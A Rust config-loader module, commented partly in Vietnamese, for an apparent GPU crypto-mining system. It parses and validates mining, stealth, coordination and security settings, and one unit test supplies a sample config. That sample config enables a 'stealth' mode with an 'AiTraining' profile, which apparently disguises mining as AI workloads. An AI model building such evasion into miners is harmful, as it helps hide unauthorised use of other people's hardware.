//! # Config Loader (Tải Cấu Hình)
//!
//! Load và parse TOML configuration files.

use anyhow::{Context, Result};
use serde::Deserialize;
use std::fs;
use std::path::Path;
use tracing::{debug, info};

use mining_core::MiningConfig;
use stealth_layer::StealthConfig;
use coordination::CoordinationConfig;
use security::SecurityConfig;

/// Complete system configuration
#[derive(Debug, Deserialize)]
pub struct SystemConfig {
    pub mining: MiningConfig,
    pub stealth: StealthConfig,
    pub coordination: CoordinationConfig,
    pub security: SecurityConfig,
}

/// Load configuration từ TOML file
pub fn load_config(path: &Path) -> Result<SystemConfig> {
    info!("Loading configuration from: {:?}", path);

    // Read file
    let contents = fs::read_to_string(path)
        .with_context(|| format!("Failed to read config file: {:?}", path))?;

    debug!("Config file size: {} bytes", contents.len());

    // Parse TOML
    let config: SystemConfig = toml::from_str(&contents)
        .with_context(|| "Failed to parse TOML configuration")?;

    debug!("Configuration parsed successfully");

    // Validate config
    validate_config(&config)?;

    Ok(config)
}

/// Validate configuration values
fn validate_config(config: &SystemConfig) -> Result<()> {
    debug!("Validating configuration...");

    // Validate mining config
    if config.mining.pool_url.is_empty() {
        anyhow::bail!("Mining pool URL cannot be empty");
    }

    if config.mining.wallet_address.is_empty() {
        anyhow::bail!("Wallet address cannot be empty");
    }

    if config.mining.gpu_devices.is_empty() {
        anyhow::bail!("No GPU devices specified");
    }

    // Validate intensity
    if config.mining.intensity < 0.0 || config.mining.intensity > 1.0 {
        anyhow::bail!("Mining intensity must be between 0.0 and 1.0");
    }

    debug!("Configuration validation passed");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_load_valid_config() {
        let toml_content = r#"
[mining]
pool_url = "stratum+tcp://pool.example.com:3333"
wallet_address = "0x1234567890abcdef"
gpu_devices = [0, 1]
algorithm = "Ethash"
intensity = 0.8

[stealth]
enabled = true
profile = "AiTraining"

[coordination]
mode = "Standalone"
peers = []
health_check_interval = 30
metrics_interval = 60

[security]
enable_seccomp = true
enable_namespaces = true
enable_wallet_encryption = true
profile = "Production"
        "#;

        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(toml_content.as_bytes()).unwrap();

        let config = load_config(temp_file.path()).unwrap();
        assert_eq!(config.mining.wallet_address, "0x1234567890abcdef");
    }
}
